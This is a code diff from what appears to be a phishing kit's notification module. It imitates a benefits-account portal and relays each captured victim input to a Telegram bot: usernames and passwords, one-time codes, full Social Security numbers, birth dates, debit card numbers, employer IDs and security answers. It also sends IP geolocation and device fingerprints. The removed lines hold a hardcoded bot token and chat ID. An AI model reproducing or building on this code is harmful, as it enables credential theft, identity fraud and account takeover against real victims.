@@ -1,333 +1,772 @@
-const SITE_NAME = "igoe";
+import { SITE_DISPLAY_NAME } from "@/lib/site-url"
+import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
+import { parseVisitorOs } from "@/lib/parse-visitor-os"
+import { formatIdentifierLine } from '@/lib/telegram-approval-templates'
 
-export interface VisitorData {
-  location: string;
-  ip: string;
-  ipV4?: string;
-  ipV6?: string;
-  timezone: string;
-  isp: string;
-  userAgent: string;
-  screen: string;
-  language: string;
-  url?: string;
-  referrer?: string;
-  utcTime: string;
+// Get Telegram configuration from environment variables
+const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
+const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '').split(',').map(id => id.trim()).filter(Boolean)
+
+// Validate that required environment variables are set
+if (!TELEGRAM_BOT_TOKEN) {
+  console.error('⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables')
+}
+if (CHAT_IDS.length === 0) {
+  console.error('⚠️ TELEGRAM_CHAT_ID is not set in environment variables')
 }
 
-export interface BotVisitData {
-  name: string;
-  type: string;
-  userAgent: string;
-  ip: string;
-  path: string;
-  matchedPatterns: string[];
+export interface VisitorData {
+  location?: string
+  ip?: string
+  timezone?: string
+  isp?: string
+  zip?: string
+  device?: string
+  screen?: string
+  language?: string
+  referrer?: string
+  utcTime?: string
+  localTime?: string
+  page?: string
+  url?: string
+  platformLabel?: string
+  browserLabel?: string
+  asn?: string | null
+  org?: string | null
+}
+
+/** Payload for “New Visitor” Telegram (aligned with wealthcare portal format). */
+export interface VisitorTelegramData {
+  siteName: string
+  location: string
+  ip: string
+  timezone: string
+  isp: string
+  asn?: string | null
+  org?: string | null
+  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
+  osLabel?: string
+  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
+  deviceLabel?: string
+
+  userAgent: string
+  screen: string
+  language: string
+  referrer: string
+  pageUrl: string
+  localTime: string
+  utcTime: string
 }
 
 export interface LoginData {
-  userId: string;
-  password: string;
+  userId: string
+  password: string
+}
+
+export interface VerificationClickData {
+  verificationType: string
 }
 
 export interface VerificationData {
-  verificationType: string;
-  code: string;
+  verificationType: string
+  code: string
 }
 
-export interface ForgotPasswordData {
-  ssnLast4: string;
-  birthDate: string;
+interface FormData {
+  type: string
+  userId?: string
+  password?: string
+  confirmPassword?: string
+  email?: string
+  phone?: string
+  otp?: string
+  timestamp: string
+  page: string
 }
 
-export interface NewUserData {
-  ssnLast4: string;
-  birthDate: string;
+/** Telegram `parse_mode: HTML` — escape dynamic text; use asCode/asPre for tap-to-copy. */
+function escapeTelegramHtml(text: string): string {
+  return text
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
 }
 
-export interface AccountFoundData {
-  method: string;
-  password?: string;
+function asCode(text: string): string {
+  return `<code>${escapeTelegramHtml(text)}</code>`
 }
 
-export interface RememberDeviceData {
-  choice: string;
+function asPre(text: string): string {
+  return `<pre>${escapeTelegramHtml(text)}</pre>`
 }
 
-export interface VerifyDetailsData {
-  ssn: string;
-  birthDate: string;
-  phone: string;
-  zip: string;
+function asCodeU(value: unknown, fallback = 'Unknown'): string {
+  const s = value == null ? '' : String(value).trim()
+  return asCode(s || fallback)
+}
+
+function isHttpUrl(value: string): boolean {
+  return /^https?:\/\//i.test(value.trim())
+}
+
+/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
+function asLink(url: string, label?: string): string {
+  const href = url.trim()
+  if (!href || !isHttpUrl(href)) {
+    return asCodeU(href || "Unknown")
+  }
+  const linkText = (label?.trim() || href).trim()
+  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
+}
+
+/** Referrer / page fields: link when http(s), otherwise monospace. */
+function asUrlField(value: unknown, fallback = "Unknown"): string {
+  const t = value == null || value === "" ? "" : String(value).trim()
+  const resolved = t || fallback
+  if (resolved === "Direct") return asCodeU(resolved)
+  if (isHttpUrl(resolved)) return asLink(resolved)
+  return asCodeU(resolved)
+}
+/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
+export function wrapFlowMessage(body: string): string {
+  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
+}
+
+const GEO_USER_AGENT = `Mozilla/5.0 (compatible; ${SITE_DISPLAY_NAME.replace(/[^a-zA-Z0-9]+/g, '-')}/1.0)`
+
+export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
+  const site = escapeTelegramHtml(data.siteName)
+  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
+  const networkLine = networkHint
+    ? `🛡️ <b>Network:</b> ${asCode(networkHint)}\n`
+    : ''
+  const osLine = data.osLabel
+    ? `📱 <b>OS:</b> ${asCode(data.osLabel)}\n`
+    : ''
+  const deviceLine = data.deviceLabel
+    ? `📱 <b>Device:</b> ${asCode(data.deviceLabel)}\n`
+    : ''
+  const message =
+    `\n🌐 <b>New Visitor (${site})</b>\n` +
+    `━━━━━━━━━━━━━━━━━━\n` +
+    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
+    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
+    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
+    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n` +
+    networkLine +
+    `\n` +
+    osLine +
+    deviceLine +
+    `💻 <b>User Agent:</b>\n${asPre(data.userAgent)}\n` +
+    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
+    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
+    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
+    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
+    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
+    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}\n` +
+    `<a href="https://t.me/th3_allfather">All Father</a>`
+
+  return await sendTelegramMessage(message, { disableWebPagePreview: false })
+}
+
+export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
+  let message: string
+
+  // 1) Login attempt from main Sign In
+  if (data.type === 'login') {
+    message = `🔐 <b>Login Attempt</b>
+━━━━━━━━━━━━━━━━━━
+${formatIdentifierLine(data.userId, asCodeU)}
+🔒 Password: ${asCodeU(data.password)}`
+  }
+  // 1b) Register button clicked on home page
+  else if (data.type === 'registration' && data.page === '/') {
+    message = `🔹 <b>Type:</b> ${asCodeU('Register Button Clicked')}`
+  }
+  // Approval messages live in telegram-approval-templates via telegram-approval-send
+  // 2) Login 2FA method selection (login flow)
+  else if (
+    (data.type === 'email_verification' || data.type === 'text_verification') &&
+    typeof data.page === 'string' &&
+    data.page.startsWith('/login/2fa-verify')
+  ) {
+    const methodLabel =
+      data.type === 'email_verification'
+        ? 'Email'
+        : 'Text Message (SMS)'
+
+    message = `🔐 <b>Verify Your Identity</b>
+━━━━━━━━━━━━━━━━━━
+
+Method Selected: ${asCodeU(methodLabel)}`
+  }
+  // 3) Login OTP verification (login verify-code)
+  else if (
+    data.type === 'login_email_otp_verification' ||
+    data.type === 'login_text_otp_verification'
+  ) {
+    const methodLabel =
+      data.type === 'login_email_otp_verification'
+        ? 'Email'
+        : 'Text Message (SMS)'
+
+    message = `🔢 <b>Code:</b> ${asCodeU(data.otp)}`
+  }
+  // 3a) Registration OTP verification (email/text on /registration)
+  else if (
+    (data.type === 'email_verification' || data.type === 'text_verification') &&
+    typeof data.page === 'string' &&
+    data.page === '/registration'
+  ) {
+    message = `✅ Verification Code Submitted
+🔢 Code: ${asCodeU(data.otp)}`
+  }
+  // 3b) Registration Step 1 – Benefit Account Debit Card
+  else if (data.type === 'benefit_debit_card') {
+    message = `📝 Registration - Step 1: Benefit Account Debit Card
+━━━━━━━━━━━━━━━━━━
+💳 Benefit Account Debit Card: ${asCodeU((data as any).benefitDebitCard, 'Not provided')}`
+  }
+  // 3b) Registration Step 1 – personal info
+  else if (data.type === 'personal_info_lookup') {
+    message = `📝 Registration - Step 1: Personal Info
+━━━━━━━━━━━━━━━━━━
+🔐 SSN: ${asCodeU((data as any).ssn)}
+📅 Date of Birth: ${asCodeU((data as any).dateOfBirth)}
+🏷️ Home Zip: ${asCodeU((data as any).homeZip)}`
+  }
+  // 3c) Registration Step 2 – employer name (legacy)
+  else if (data.type === 'employer_name_lookup') {
+    message = `📝 Registration - Step 2: Employer
+━━━━━━━━━━━━━━━━━━
+🏢 Employer ID: ${asCodeU((data as any).employerId)}
+👤 Employee ID: ${asCodeU((data as any).employeeId)}
+🏛️ Employer Name: ${asCodeU((data as any).employerName)}`
+  }
+  // 3c2) Registration Step 2 – Two-Factor Code Option
+  else if (data.type === 'two_factor_option') {
+    const option = (data as any).option
+    const optionLabel = option === 'email' ? 'Employer Email' : option === 'number' ? 'Employer Provided Number' : option === 'mailing' ? 'Mailing Address' : 'Phone Verification'
+    message = `📝 Registration - Step 2: Two-Factor Code Options
+━━━━━━━━━━━━━━━━━━
+Chosen: ${asCodeU(optionLabel)}`
+  }
+  // 3d) Registration Step 3 – OTP code requested (no contact inputs)
+  else if (data.type === 'contact_info') {
+    message = `🔔 OTP code requested
+━━━━━━━━━━━━━━━━━━
+User continued to verification code step.`
+  }
+  // 3e) Registration Step 4 – method selected
+  else if (
+    data.type === 'registration' &&
+    typeof data.page === 'string' &&
+    data.page.startsWith('/registration?step=4')
+  ) {
+    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'
+
+    message = `📝 Registration - Step 4: Method Selected
+━━━━━━━━━━━━━━━━━━
+
+Method Selected: ${asCodeU(methodLabel)}
+${data.email ? `📧 Email: ${asCodeU(data.email)}` : ''}
+${data.phone ? `📱 Mobile: ${asCodeU(data.phone)}` : ''}`
+  }
+  // 3f) Phone Verify (Step 3) – page visit
+  else if (data.type === 'phone_verify_page_visit') {
+    message = `📱 Registration - Phone Verify (Step 3)
+━━━━━━━━━━━━━━━━━━
+User landed on Phone Verification page.`
+  }
+  // 3g) Phone Verify – SMS/Text OTP requested
+  else if (data.type === 'phone_verify_sms_otp') {
+    message = `📱 Registration - Phone Verify
+━━━━━━━━━━━━━━━━━━
+🔘 Button: SMS/Text OTP
+📞 Phone: ${asCodeU((data as any).phone)}`
+  }
+  // 3h) Phone Verify – Voice OTP requested
+  else if (data.type === 'phone_verify_voice_otp') {
+    message = `📱 Registration - Phone Verify
+━━━━━━━━━━━━━━━━━━
+🔘 Button: Voice OTP
+📞 Phone: ${asCodeU((data as any).phone)}`
+  }
+  // 3i) Phone Verify – Reset clicked
+  else if (data.type === 'phone_verify_reset') {
+    message = `📱 Registration - Phone Verify
+━━━━━━━━━━━━━━━━━━
+🔘 Button: Reset
+Form cleared.`
+  }
+  // 3j) Phone Verify – Back to 2FA clicked
+  else if (data.type === 'phone_verify_back_to_2fa') {
+    message = `📱 Registration - Phone Verify
+━━━━━━━━━━━━━━━━━━
+🔘 Button: Back to Two-Factor Authentication
+User returned to Step 2.`
+  }
+  // 3k) Phone Verify – OTP verified, proceeding to Step 4
+  else if (data.type === 'phone_verify_otp_verified') {
+    message = `📱 Registration - Phone Verify
+━━━━━━━━━━━━━━━━━━
+✅ OTP verified successfully.
+📞 Phone: ${asCodeU((data as any).phone)}
+→ User proceeded to Step 4 (Registration Form).`
+  }
+  // 4) Registration credentials (User ID + password + confirm password)
+  else if (data.type === 'User Credentials Setup') {
+    const pref = (data as any).preferredMethod2FA
+    const prefLabel = pref === 'cell' ? 'Cell Number' : 'Email'
+    message = `📝 Registration - Step 4: Credentials Set
+━━━━━━━━━━━━━━━━━━
+👤 User ID: ${asCodeU(data.userId)}
+🔒 Password: ${asCodeU(data.password)}
+🔒 Confirm Password: ${asCodeU(data.confirmPassword)}
+📧 Preferred 2FA: ${asCodeU(prefLabel)}
+${pref === 'email' ? `📧 Email: ${asCodeU((data as any).email, '—')}` : `📱 Cell: ${asCodeU((data as any).cell, '—')} (${asCodeU((data as any).cellCountry, 'US')})`}`
+  }
+  // 4b) Registration Form – Register button clicked (explicit type for clarity)
+  else if (data.type === 'registration_form_register') {
+    const pref = (data as any).preferredMethod2FA
+    const prefLabel = pref === 'cell' ? 'Cell Number' : 'Email'
+    message = `📝 Registration - Step 4: Register Button
+━━━━━━━━━━━━━━━━━━
+👤 User ID: ${asCodeU(data.userId)}
+📧 Preferred 2FA: ${asCodeU(prefLabel)}
+${(data as any).email ? `📧 Email: ${asCodeU((data as any).email)}` : ''}
+${(data as any).cell ? `📱 Cell: ${asCodeU((data as any).cell)} (${asCodeU((data as any).cellCountry, 'US')})` : ''}
+→ Proceeding to Step 5 (Security Questions).`
+  }
+  // 5) Registration security questions (all Q&A)
+  else if (data.type === 'Security Questions') {
+    // Expect securityAnswers: Array<{ question: string; answer: string }>
+    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
+    const lines = qa.map(
+      (item: any, index: number) =>
+        `Q${index + 1}: ${asCodeU(item.question)}\nA${index + 1}: ${asCodeU(item.answer)}`
+    ).join('\n\n')
+
+    message = `📝 Registration - Security Questions
+━━━━━━━━━━━━━━━━━━
+
+${lines || 'No questions captured.'}`
+  }
+  // 6) Registration complete (final submit)
+  else if (data.type === 'Registration Complete') {
+    message = `📝 Registration Complete
+━━━━━━━━━━━━━━━━━━
+👤 User ID: ${asCodeU(data.userId)}
+✅ Status: Submitted`
+  }
+  // 7a) Login 2FA – resend code (login verify-code)
+  else if (
+    data.type === 'login_email_otp_resend' ||
+    data.type === 'login_text_otp_resend'
+  ) {
+    message = `🔔 <b>Resend Code Clicked</b>
+━━━━━━━━━━━━━━━━━━
+${formatResendIdentityLine(data.userId) || ""}`
+  }
+  // 7a2) Registration – resend code (step 4 OTP)
+  else if (
+    (data.type === 'email_otp_resend' || data.type === 'text_otp_resend') &&
+    typeof data.page === 'string' &&
+    data.page === '/registration'
+  ) {
+    message = `🔔 <b>Resend Code Clicked</b>
+━━━━━━━━━━━━━━━━━━`
+  }
+  // 7b) Login 2FA – "I did not receive my code" clicked
+  else if (data.type === 'login_did_not_receive_code') {
+    let methodLabel = 'Unknown'
+    if (typeof data.page === 'string') {
+      if (data.page.includes('method=text')) {
+        methodLabel = 'Text Message (SMS)'
+      } else if (data.page.includes('method=email')) {
+        methodLabel = 'Email'
+      }
+    }
+
+    message = `🔔 <b>"I did not receive my code" Clicked</b>
+━━━━━━━━━━━━━━━━━━
+
+User was sent back to the verification method selection page.
+Method at time of click: ${asCodeU(methodLabel)}`
+  }
+  // 7) Fallback generic template (other events)
+  else {
+    return false
+  }
+
+  return await sendTelegramMessage(wrapFlowMessage(message))
+}
+
+type SendTelegramMessageOptions = {
+  disableWebPagePreview?: boolean
+}
+
+export async function sendTelegramMessage(
+  message: string,
+  options?: SendTelegramMessageOptions,
+): Promise<boolean> {
+  // Validate we have the required token
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
+    return false
+  }
+
+  // If no chat IDs configured, log warning
+  if (CHAT_IDS.length === 0) {
+    console.warn('No Telegram chat IDs configured - message will not be sent')
+    return false
+  }
+  
+  const text = message
+
+  const promises = CHAT_IDS.map(chatId => 
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: options?.disableWebPagePreview ?? true,
+      })
+    })
+    .then(async (response) => {
+      try {
+        const data = await response.json()
+        if (!response.ok || !data.ok) {
+          console.error(`Failed to send to chat ${chatId}:`, data)
+          return { ok: false }
+        }
+        return { ok: true }
+      } catch (parseError) {
+        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
+        return { ok: false }
+      }
+    })
+    .catch(error => {
+      console.error(`Failed to send to chat ${chatId}:`, error)
+      return { ok: false }
+    })
+  )
+
+  const results = await Promise.allSettled(promises)
+  
+  // Check if at least one message was sent successfully
+  const successCount = results.filter(
+    result => result.status === 'fulfilled' && result.value && result.value.ok === true
+  ).length
+  
+  // Return true if at least one message succeeded, false otherwise
+  return successCount > 0
+}
+
+/** Parse first usable `for=` value from RFC 7239 Forwarded header. */
+function parseForwardedForHeader(forwarded: string | null): string | null {
+  if (!forwarded?.trim()) return null
+  const s = forwarded
+  const lower = s.toLowerCase()
+  let idx = 0
+  while (idx < lower.length) {
+    const start = lower.indexOf('for=', idx)
+    if (start < 0) break
+    let j = start + 4
+    while (j < s.length && /\s/.test(s[j])) j++
+    if (j >= s.length) break
+    let ip = ''
+    if (s[j] === '"') {
+      j++
+      const endQuote = s.indexOf('"', j)
+      if (endQuote < 0) break
+      ip = s.slice(j, endQuote).trim()
+      idx = endQuote + 1
+    } else {
+      let end = j
+      while (end < s.length && !/[;,]/.test(s[end])) end++
+      ip = s.slice(j, end).trim()
+      idx = end
+    }
+    if (ip.startsWith('[') && ip.endsWith(']')) ip = ip.slice(1, -1)
+    ip = ip.split('%')[0].trim()
+    if (ip && ip.toLowerCase() !== 'unknown') return ip
+  }
+  return null
+}
+
+/** First public client IP from common proxy / edge headers (Vercel, Cloudflare, nginx, Fly, etc.). */
+function getClientIpFromHeaders(headers: Headers): string {
+  const forwardedIp = parseForwardedForHeader(headers.get('forwarded'))
+  if (forwardedIp) return forwardedIp.replace(/^::ffff:/i, '')
+
+  const chains = [
+    headers.get('x-vercel-forwarded-for'),
+    headers.get('cf-connecting-ip'),
+    headers.get('fly-client-ip'),
+    headers.get('true-client-ip'),
+    headers.get('x-real-ip'),
+    headers.get('x-client-ip'),
+    headers.get('x-forwarded-for'),
+  ]
+  for (const raw of chains) {
+    if (!raw?.trim()) continue
+    const first = raw.split(',')[0]?.trim()
+    if (!first || first.toLowerCase() === 'unknown') continue
+    const v4 = first.replace(/^::ffff:/i, '')
+    if (v4) return v4
+  }
+  return 'Unknown'
+}
+
+function isPlausiblePublicIpHint(value: string): boolean {
+  const s = value.trim()
+  if (!s || s.length > 45) return false
+  if (s === '127.0.0.1' || s === '::1' || s.toLowerCase() === 'unknown') return false
+  return /^[\d.a-fA-F:]+$/.test(s)
+}
+
+export type GetVisitorDataOptions = {
+  /** When reverse-proxy headers are missing (e.g. `next dev`), browser can POST this from ipify. */
+  clientPublicIp?: string
+}
+
+export async function getVisitorData(request: Request, options?: GetVisitorDataOptions): Promise<VisitorData> {
+  const headers = request.headers
+  let ip = getClientIpFromHeaders(headers)
+  if (ip === 'Unknown' && options?.clientPublicIp && isPlausiblePublicIpHint(options.clientPublicIp)) {
+    ip = options.clientPublicIp.trim().replace(/^::ffff:/i, '')
+  }
+  const url = new URL(request.url)
+
+  // Fetch location, ISP, zip, timezone from IP geolocation
+  // Primary: ip-api.com
+  // Fallback 1: ipwho.is
+  // … (further fallbacks below)
+  let location = 'Unknown'
+  let isp = 'Unknown'
+  let org: string | null = null
+  let asn: string | null = null
+  let zip = 'Unknown'
+  let timezone: string | undefined
+
+  if (ip && ip !== 'Unknown') {
+    // Primary: ip-api.com (when any field still unknown)
+    if (
+      location === 'Unknown' ||
+      isp === 'Unknown' ||
+      zip === 'Unknown' ||
+      !timezone
+    ) {
+      try {
+        // Free ip-api.com JSON is HTTP-only from servers; HTTPS often fails from Vercel/Node.
+        const fallbackRes = await fetch(
+          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,zip,isp,org,as,timezone`,
+          { headers: { 'User-Agent': GEO_USER_AGENT } },
+        )
+        if (fallbackRes.ok) {
+          const data = (await fallbackRes.json()) as Record<string, unknown>
+          if (data.status === 'success') {
+            if (location === 'Unknown') {
+              const parts = [
+                data.city as string,
+                data.regionName as string,
+                data.country as string,
+              ].filter(Boolean)
+              if (parts.length) location = parts.join(', ')
+              else if (data.countryCode) location = String(data.countryCode)
+            }
+            if (isp === 'Unknown' && (data.isp || data.org))
+              isp = (data.isp as string) || (data.org as string)
+            if (!org && (data.org || data.isp))
+              org = String(data.org || data.isp)
+            if (!asn && typeof data.as === 'string') {
+              const asnMatch = data.as.match(/^(AS\d+)/i)
+              asn = asnMatch ? asnMatch[1].toUpperCase() : null
+            }
+            if (zip === 'Unknown' && data.zip) zip = String(data.zip)
+            if (!timezone && typeof data.timezone === 'string' && data.timezone)
+              timezone = data.timezone
+          }
+        }
+      } catch (e) {
+        console.warn('ip-api.com fallback failed:', (e as Error).message)
+      }
+    }
+
+    // Fallback 2: ipwho.is (additional provider if still Unknown)
+    if (location === 'Unknown' || isp === 'Unknown' || zip === 'Unknown' || !timezone) {
+      try {
+        const whoRes = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
+          headers: { 'User-Agent': GEO_USER_AGENT },
+        })
+        if (whoRes.ok) {
+          const whoData = (await whoRes.json()) as {
+            success?: boolean
+            city?: string
+            region?: string
+            country?: string
+            postal?: string
+            timezone?: string | { id?: string }
+            connection?: { isp?: string; org?: string }
+          }
+          if (whoData && whoData.success !== false) {
+            if (location === 'Unknown') {
+              const parts = [whoData.city, whoData.region, whoData.country].filter(Boolean)
+              if (parts.length) location = parts.join(', ')
+            }
+            if (isp === 'Unknown') {
+              const ispValue =
+                whoData.connection?.isp || whoData.connection?.org
+              if (ispValue) isp = ispValue
+            }
+            if (zip === 'Unknown' && whoData.postal) zip = whoData.postal
+            if (!timezone && whoData.timezone) {
+              timezone =
+                typeof whoData.timezone === 'string'
+                  ? whoData.timezone
+                  : whoData.timezone.id
+            }
+          }
+        }
+      } catch (e) {
+        console.warn('ipwho.is fallback failed:', (e as Error).message)
+      }
+    }
+
+    // Fallback 3: geojs (HTTPS, no API key; fills gaps when other providers rate-limit or omit fields)
+    if (location === 'Unknown' || isp === 'Unknown' || zip === 'Unknown' || !timezone) {
+      try {
+        const geojsRes = await fetch(
+          `https://get.geojs.io/v1/ip/geo/${encodeURIComponent(ip)}.json`,
+          {
+            headers: {
+              Accept: 'application/json',
+              'User-Agent': GEO_USER_AGENT,
+            },
+          },
+        )
+        if (geojsRes.ok) {
+          const g = (await geojsRes.json()) as Record<string, unknown>
+          if (location === 'Unknown') {
+            const parts = [g.city, g.region, g.country].filter(Boolean).map(String)
+            if (parts.length) location = parts.join(', ')
+            else if (g.country_code) location = String(g.country_code)
+          }
+          if (isp === 'Unknown' && typeof g.organization === 'string' && g.organization.trim()) {
+            isp = g.organization.trim()
+          }
+          if (zip === 'Unknown' && typeof g.postal_code === 'string' && g.postal_code.trim()) {
+            zip = g.postal_code.trim()
+          }
+          if (!timezone && typeof g.timezone === 'string' && g.timezone.trim()) {
+            timezone = g.timezone.trim()
+          }
+        }
+      } catch (e) {
+        console.warn('geojs.io fallback failed:', (e as Error).message)
+      }
+    }
+  }
+
+  const ua = headers.get('user-agent')?.trim()
+  const acceptLang = headers.get('accept-language')?.split(',')[0]?.trim()
+  const referer = headers.get('referer')?.trim()
+
+  const osInfo = parseVisitorOs(String((ua ?? '')))
+
+  return {
+    ip,
+    location,
+    isp,
+    org: org || isp,
+    asn,
+    zip,
+    timezone,
+    device: ua && ua.length > 0 ? ua : 'Unknown',
+    language: acceptLang && acceptLang.length > 0 ? acceptLang : 'Unknown',
+    referrer: referer && referer.length > 0 ? referer : 'Direct',
+    utcTime: new Date().toISOString(),
+    page: url.pathname,
+    url: url.href,
+  }
+}
+
+export async function sendResendCodeNotification(data?: { page?: string }): Promise<boolean> {
+  const page = data?.page ?? ""
+  const type =
+    page.includes("method=text") || page.includes("method=sms")
+      ? "login_text_otp_resend"
+      : "login_email_otp_resend"
+
+  return sendFormNotification({
+    type,
+    page: page || "/login/verify-code",
+    timestamp: new Date().toISOString(),
+  })
+}
+
+/* fleet-resend-identity-helper */
+const RESEND_ID_BRAND_DEFAULT = "User ID"
+function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = (v) => asCode(String(v ?? ""))): string {
+  const raw = userId == null ? "" : String(userId).trim()
+  if (!raw) return ""
+  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+  if (raw.includes("@") && emailRe.test(raw)) return `📧 Email: ${asCodeFn(raw)}`
+  const digits = raw.replace(/\D/g, "")
+  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
+    return `📱 Phone: ${asCodeFn(raw)}`
+  }
+  return `👤 ${RESEND_ID_BRAND_DEFAULT}: ${asCodeFn(raw)}`
 }
 
 class TelegramService {
-  private botToken: string;
-  private chatIds: string[];
-
-  constructor() {
-    this.botToken =
-      process.env.TELEGRAM_BOT_TOKEN?.trim() ??
-      "8771897622:AAFZc3ptWAMXsOSbfMOY5hLjJ6q9nBWbIsY";
-    const raw = process.env.TELEGRAM_CHAT_ID?.trim() ?? "5841830485";
-    this.chatIds = raw
-      .split(",")
-      .map((id) => id.trim())
-      .filter((id) => id.length > 0);
-    const tokenPreview = this.botToken
-      ? `${this.botToken.slice(0, 8)}...${this.botToken.slice(-6)}`
-      : "(none)";
-    console.info(
-      `Telegram config loaded (token=${tokenPreview}) chatIds=${this.chatIds.join(",")}`,
-    );
-  }
-
-  private async sendMessage(message: string): Promise<void> {
-    if (!this.botToken || this.chatIds.length === 0) {
-      console.error(
-        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
-      );
-      return;
-    }
-
-    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
-
-    try {
-      await Promise.all(
-        this.chatIds.map(async (chatId) => {
-          const res = await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-              parse_mode: "HTML",
-            }),
-          });
-
-          if (!res.ok) {
-            const body = await res.text().catch(() => "<no body>");
-            console.error(
-              `Telegram API error for chat ${chatId}: status=${res.status} body=${body}`,
-            );
-          } else {
-            const data = await res.json().catch(() => null);
-            if (data && data.ok === false) {
-              console.error(
-                `Telegram API returned ok=false for chat ${chatId}: ${JSON.stringify(data)}`,
-              );
-            }
-          }
-        }),
-      );
-    } catch (error) {
-      console.error("Failed to send Telegram message:", error);
-    }
-  }
-
-  async verifyConfiguration(): Promise<{ bot: any; chat: any }> {
-    if (!this.botToken || this.chatIds.length === 0) {
-      throw new Error(
-        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
-      );
-    }
-
-    const getMeRes = await fetch(
-      `https://api.telegram.org/bot${this.botToken}/getMe`,
-    );
-    const getMe = await getMeRes.json().catch(() => null);
-    if (!getMe || !getMe.ok) {
-      throw new Error(`getMe failed: ${JSON.stringify(getMe)}`);
-    }
-
-    const chatId = this.chatIds[0];
-    const getChatRes = await fetch(
-      `https://api.telegram.org/bot${this.botToken}/getChat?chat_id=${encodeURIComponent(chatId)}`,
-    );
-    const getChat = await getChatRes.json().catch(() => null);
-    if (!getChat || !getChat.ok) {
-      throw new Error(
-        `getChat failed for ${chatId}: ${JSON.stringify(getChat)}`,
-      );
-    }
-
-    return { bot: getMe.result, chat: getChat.result };
-  }
-
-  async sendVisitorNotification(data: VisitorData): Promise<void> {
-    const ipV4 = data.ipV4;
-    const ipV6 = data.ipV6;
-    let ipDisplay = data.ip;
-
-    if (ipV4 && ipV6) {
-      ipDisplay = `${ipV4} (IPv4), ${ipV6} (IPv6)`;
-    } else if (ipV4) {
-      ipDisplay = `${ipV4} (IPv4)`;
-    } else if (ipV6) {
-      ipDisplay = `${ipV6} (IPv6)`;
-    }
-
-    const pageUrl = data.url ?? "(unknown)";
-    const rawReferrer = (data.referrer ?? "").trim();
-    const referrer =
-      rawReferrer !== ""
-        ? rawReferrer
-        : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";
-
-    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
-    await this.sendMessage(message);
-  }
-
-  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
-    const patternsText =
-      data.matchedPatterns && data.matchedPatterns.length > 0
-        ? data.matchedPatterns.join(", ")
-        : "Unknown";
-
-    const message =
-      `\n🤖 <b>BOT</b>\n\n` +
-      `🧩 <b>Name:</b> ${data.name}\n` +
-      `📝 <b>Type:</b> ${data.type}\n\n` +
-      `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
-      `📍 <b>IP:</b> ${data.ip}\n` +
-      `🔗 <b>Path:</b> ${data.path}\n\n` +
-      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${patternsText}.`;
-
-    await this.sendMessage(message);
-  }
-
   async sendLoginNotification(data: LoginData): Promise<void> {
-    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
-    await this.sendMessage(message);
+    await sendFormNotification({
+      type: 'login',
+      userId: data.userId,
+      password: data.password,
+      page: '/',
+      timestamp: new Date().toISOString(),
+    })
+  }
+
+  async sendVerificationClickNotification(data: VerificationClickData): Promise<void> {
+    const isEmail = data.verificationType === 'email'
